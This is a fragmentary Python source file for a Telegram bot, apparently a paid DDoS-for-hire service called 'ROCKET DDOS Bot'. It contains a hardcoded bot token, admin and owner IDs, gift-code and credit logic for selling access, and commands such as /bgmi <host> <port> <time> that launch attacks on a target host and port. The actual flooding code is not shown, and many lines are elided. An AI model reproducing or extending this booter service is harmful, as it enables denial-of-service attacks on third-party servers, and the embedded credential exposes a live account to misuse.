...
bot = telebot.TeleBot('8094762708:AAGE0IqwJIEGMtTA1mYXhTpY6ZZWmSUD8i4')
# Owner and admin user IDs
owner_id = "6658831303"
admin_ids = ["6658831303"]
...
def send_welcome(message):
    response = (
        f"🌟 Welcome to the ROCKET DDOS Bot! 🌟\n\n"
        ...
        "💥 /bgmi <host> <port> <time> - For DDoS attack\n"
    ...
    if user_id in admin_ids:
        ...
        if len(command) == 3:
            ...
            try:
                ...
                if num_codes <= 0:
                    raise ValueError("Number of codes must be greater than 0.")
            except ValueError:
                bot.send_message(message.chat.id, "Please specify a valid number of codes.")
                return

            if duration in key_prices:
                amount_per_code = key_prices[duration]
                total_amount = amount_per_code * num_codes

                if user_id in free_user_credits and free_user_credits[user_id] >= total_amount:
                    created_codes = []
                    for _ in range(num_codes):
                        code = "ROCKET-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
                        gift_codes[code] = duration
                        created_codes.append(f"`{code}`")  # Wrap code in backticks

                    free_user_credits[user_id] -= total_amount
                    response = (
                        f"Successfully created {num_codes} gift codes for {duration}.\n\n"
                        "Codes:\n" + "\n".join(created_codes)
                    )
                else:
                    response = (
                        f"You do not have enough credits to create {num_codes} gift codes. "
                        f"Required: {total_amount}, Available: {free_user_credits[user_id]}"
                    )
            else:
                response = "Invalid duration. Use 'day', 'week', or 'month'."
        else:
            response = "Usage: /creategift <day|week|month> <number_of_codes>"
    else:
...
def start_attack_reply(message, target, port, time):
    ...
    response = f"🎉 DDOS STARTED 🎉\n\n🎯 𝙏𝘼𝙍𝙂𝙀𝙏 LOCKED 🔐 :--> {target} 🌟\n🔫 𝐏𝐨𝐫𝐭 SETT :--> {port} 🌟\n🕦DDOS TIME :--> {time}\n💣 DDOS BYE :--> ROCKET TEAM 🔥\n\n🔥Status: Attack in Progress... 🔥\n\n@{username} THANKS TO USING OUR BOT ⚡"
...
@bot.message_handler(func=lambda message: message.text and (message.text.startswith('/bgmi') or not message.text.startswith('/')))
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4 or (not message.text.startswith('/') and len(command) == 3):
            ...
            if time > 300:
                ...
                response = f"DDOS FINISHED ❗\n\n🤖 TARGET UNLOCKED 🔓:--> {target}\n🔫 𝐏𝐨𝐫𝐭 BREACHED :--> {port}\n DDOS TIME :--> {time} ⏲️"
        else:
            response ="Please provide cmd in the following format:\n\n/bgmi <host> <port> <time>\n\nBOTS ARE NOT ALLOWED 🚫" 
    else:
        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. "
                    ...
                    "🌟THE ONLY OWNER IS @harshvisbwakarma007 DM TO BUY ACCESS\n\n NOTE:- YOU CAN ASK FOR TRAIL BEFORE PURCHASING BOY")
...
def handle_unknown_command(message):
    response = (
        f"🌟 Welcome to the ROCKRT DDOS Bot! 🌟\n\n"
        f"Current Time: {get_current_time()}\n\n"
        "Here are some commands you can use:\n"
        "❌ /removeuser <id> - Remove a user\n"
        "🔑 /addadmin <id> <balance> - Add an admin with a starting balance\n"
        "🚫 /removeadmin <id> - Remove an admin\n"
        "💰 /checkbalance - Check your balance\n"
        "💥 /fuck <host> <port> <time> - START a DDoS attack\n"
        "💸 /setkeyprice <day/week/month> <price> - Set key price for different durations (Owner only)\n"
        "🎁 /creategift <duration> - Create a gift code for a specified duration (Admin only)\n"
        "🎁 /redeem <code> - Redeem a gift code\n"
